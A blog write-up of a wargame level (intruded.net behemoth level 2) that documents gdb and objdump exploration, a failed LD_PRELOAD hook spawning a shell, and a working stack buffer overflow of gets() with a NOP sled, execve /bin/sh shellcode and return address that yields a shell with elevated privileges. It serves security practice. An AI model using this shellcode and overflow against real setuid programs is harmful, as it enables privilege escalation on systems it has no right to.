Title: intruded.net, behemoth: level 2
Date: 2011/09/27 21:21
Author: Ken Ko
Tags: shellcode, intruded.net, x86, gdb, stack, behemoth
Category: tutorials

Trial and error: 

<code class="bash">
level2@behemoth:/tmp$ /wargame/level2
Password: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Authentication failure.
Sorry.
Illegal instruction
level2@behemoth:/tmp$ echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" | wc -c
93
</code>

Tried to have shellcode in an environment variable again... does not work out too well. 

Try again, slowly and with purpose.

<code>
level2@behemoth:/tmp$ objdump -d /wargame/level2 | grep @plt
080482b8 <seteuid@plt-0x10>:
080482c8 <seteuid@plt>:
080482d8 <gets@plt>:
080482e8 <__libc_start_main@plt>:
080482f8 <printf@plt>:
08048308 <__gmon_start__@plt>:
 804833c:       e8 a7 ff ff ff          call   80482e8 <__libc_start_main@plt>
 8048361:       e8 a2 ff ff ff          call   8048308 <__gmon_start__@plt>
 80483f7:       e8 cc fe ff ff          call   80482c8 <seteuid@plt>
 8048403:       e8 f0 fe ff ff          call   80482f8 <printf@plt>
 804840e:       e8 c5 fe ff ff          call   80482d8 <gets@plt>
 804841a:       e8 d9 fe ff ff          call   80482f8 <printf@plt>
level2@behemoth:/tmp$
</code>

After the <strong>seteuid</strong> we see the following functions are called with--allegedly--higher privilege: [1] <strong>printf</strong>, <strong>gets</strong>, <strong>printf</strong>. Interesting is that there's no <strong>strcmp</strong> to test whether the password is correct or invalid. Lame!

Trying another LD_PRELOAD trick:

<code>
level2@behemoth:/tmp$ cat /tmp/gets.c
#include <stdlib.h>

char * gets(char * s) {
        printf("help\n");
        system ("/bin/sh");
        printf("me\n");
}
level2@behemoth:/tmp$ !gcc
gcc -fPIC -shared -o gets gets.c
level2@behemoth:/tmp$ LD_PRELOAD="/tmp/gets" /wargame/level2
Password: lame.
Authentication failure.
Sorry.
level2@behemoth:/tmp$
</code>

Doesn't work :(

What's more annoying, though, is that the LD_PRELOAD works with gdb! Ugh.

<code>
(gdb) r
Starting program: /wargame/level2
Password: help
sh-3.1$ whoami
level2
sh-3.1$
</code>

Anyhow, let's try to go another route. Back to the buffer overflow? 

<code>
unset LD_PRELOAD
</code>

Unset that before going into gdb! 

<code>
Start it from the beginning? (y or n) y
Starting program: /wargame/level2
Password: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBA
Authentication failure.
Sorry.

Program received signal SIGSEGV, Segmentation fault.
0x41424241 in ?? ()
(gdb) i r
eax            0x1f     31
ecx            0x8048553        134514003
edx            0xb7fe1448       -1208085432
ebx            0xb7fdfff4       -1208090636
esp            0xbffffa60       0xbffffa60
ebp            0x41414141       0x41414141
esi            0x0      0
edi            0xb8000cc0       -1207956288
eip            0x41424241       0x41424241
eflags         0x10286  [ PF SF IF RF ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
(gdb)
</code>

Nice. <strong>$eip</strong> is now overwritten. <em>Where do I point this?</em>

<code>
level2@behemoth:/tmp$ (python -c 'print "A" * 92'; cat) | /wargame/level2
Password: Authentication failure.
Sorry.

Illegal instruction
</code>

Something a bit more concise.

Disassemble main for some ideas:

<code>
(gdb) disas main
Dump of assembler code for function main:
0x080483d4 <main+0>:    push   %ebp
0x080483d5 <main+1>:    mov    %esp,%ebp
0x080483d7 <main+3>:    sub    $0x68,%esp
0x080483da <main+6>:    and    $0xfffffff0,%esp
0x080483dd <main+9>:    mov    $0x0,%eax
0x080483e2 <main+14>:   add    $0xf,%eax
0x080483e5 <main+17>:   add    $0xf,%eax
0x080483e8 <main+20>:   shr    $0x4,%eax
0x080483eb <main+23>:   shl    $0x4,%eax
0x080483ee <main+26>:   sub    %eax,%esp
0x080483f0 <main+28>:   movl   $0x3eb,(%esp)
0x080483f7 <main+35>:   call   0x80482c8 <seteuid@plt>
0x080483fc <main+40>:   movl   $0x8048528,(%esp)
0x08048403 <main+47>:   call   0x80482f8 <printf@plt>
0x08048408 <main+52>:   lea    0xffffffa8(%ebp),%eax
0x0804840b <main+55>:   mov    %eax,(%esp)
0x0804840e <main+58>:   call   0x80482d8 <gets@plt>
0x08048413 <main+63>:   movl   $0x8048534,(%esp)
0x0804841a <main+70>:   call   0x80482f8 <printf@plt>
0x0804841f <main+75>:   leave
0x08048420 <main+76>:   ret
0x08048421 <main+77>:   nop
0x08048422 <main+78>:   nop
0x08048423 <main+79>:   nop
0x08048424 <main+80>:   nop
0x08048425 <main+81>:   nop
0x08048426 <main+82>:   nop
0x08048427 <main+83>:   nop
0x08048428 <main+84>:   nop
0x08048429 <main+85>:   nop
0x0804842a <main+86>:   nop
0x0804842b <main+87>:   nop
0x0804842c <main+88>:   nop
0x0804842d <main+89>:   nop
0x0804842e <main+90>:   nop
0x0804842f <main+91>:   nop
</code>

What's important to us:

<code>
0x0804840e <main+58>:   call   0x80482d8 <gets@plt>
. . .
(gdb) b *0x0804840e
Breakpoint 1 at 0x804840e
(gdb) r
Starting program: /wargame/level2

Breakpoint 1, 0x0804840e in main ()
(gdb) i r
eax            0xbffffa00       -1073743360
ecx            0x8048532        134513970
edx            0xb7fe1448       -1208085432
ebx            0xb7fdfff4       -1208090636
esp            0xbffff9e0       0xbffff9e0
ebp            0xbffffa58       0xbffffa58
esi            0x0      0
edi            0xb8000cc0       -1207956288
eip            0x804840e        0x804840e <main+58>
eflags         0x286    [ PF SF IF ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
(gdb)
</code>

Here's an idea: put some shellcode in <strong>$eax</strong> and redirect <strong>$eip</strong> to <strong>\x00\xfa\xff\xbf</strong>. 

<code>
level2@behemoth:/tmp$ (python -c 'print "\x90" * 20 + "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x1e\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\x31\xc0\x31\xdb\xb0\x01\xcd\x80\xe8\xdd\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x23\x41\x41\x41\x41\x42\x42\x42\x42" + "\x90" * 11 + "\x00\xfa\xff\xbf"'; cat) | /wargame/level2
Password: Authentication failure.
Sorry.
whoami
level3
</code>

<em>Nice</em>! I don't know why there's no $ or # indicator for the shell but that's probably a .bashrc problem--or something similar. Inconsequential for my purposes, though.

Onwards!
